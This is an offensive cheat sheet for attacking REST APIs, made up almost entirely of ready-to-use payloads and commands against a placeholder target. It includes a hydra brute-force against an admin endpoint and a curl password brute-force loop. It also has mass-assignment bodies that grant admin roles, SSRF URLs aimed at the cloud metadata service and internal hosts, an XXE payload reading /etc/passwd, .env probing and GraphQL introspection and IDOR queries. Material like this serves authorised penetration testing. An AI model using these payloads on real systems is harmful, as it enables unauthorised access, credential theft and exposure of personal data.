# REST API Security Vulnerabilities

## 1. Broken Object Level Authorization (BOLA/IDOR)
```bash
# Change ID in request
GET /api/users/1 -> GET /api/users/2
GET /api/users/me -> GET /api/users/admin
# UUID enumeration
GET /api/users/550e8400-e29b-41d4-a716-446655440000
```

## 2. Broken Authentication
```bash
# JWT manipulation
# API key in URL
GET /api/users?api_key=stolen_key
# Basic auth bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /api/admin
```

## 3. Excessive Data Exposure
```bash
# API returns more data than UI shows
GET /api/users/1
# Response may include: ssn, creditCard, internalId, role
```

## 4. Lack of Resources & Rate Limiting
```bash
# Brute force without rate limit
for i in $(seq 1 10000); do curl -sk "http://target/api/login" -d "user=admin&pass=$i"; done
# Batch request
curl -sk "http://target/api/users" -d '{"ids":[1,2,3,4,5,6,7,8,9,10]}'
```

## 5. Broken Function Level Authorization
```bash
# Access admin functions
GET /api/admin/users
DELETE /api/users/1
PUT /api/users/1/role {"role":"admin"}
```

## 6. Mass Assignment
```bash
# Inject additional parameters
POST /api/users
{"username":"test","email":"test@test.com","role":"admin","isAdmin":true}
```

## 7. SSRF via API
```bash
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
GET /api/webhook?url=http://internal-service:8080/admin
```

## 8. API Versioning Issues
```bash
# Try older API versions
GET /api/v1/users
GET /api/v2/users
GET /api/internal/users
GET /api/debug/users
```

## 9. HTTP Method Manipulation
```bash
# Change method to bypass auth
GET /api/admin/users -> 403
POST /api/admin/users -> 200?
PUT /api/admin/users -> 200?
PATCH /api/admin/users -> 200?
OPTIONS /api/admin/users -> Check allowed methods
```

## 10. API Key Exposure
```bash
# Check common locations
GET /api/docs
GET /swagger-ui.html
GET /openapi.json
GET /api.json
GET /.env
```

## 11. GraphQL API Attacks
```graphql
# Introspection
{__schema{types{name,fields{name}}}}
# IDOR
{user(id:1){email,ssn}}
```

## 12. XML API Attacks
```xml
<!-- XXE via XML API -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

## API Discovery
```bash
# Swagger/OpenAPI
curl -sk "http://target/swagger.json"
curl -sk "http://target/openapi.json"
curl -sk "http://target/api-docs"
# GraphQL
curl -sk "http://target/graphql" -d '{"query":"{__schema{types{name}}}"}'
# Common API paths
/api/v1, /api/v2, /api/internal, /api/admin, /api/debug
```
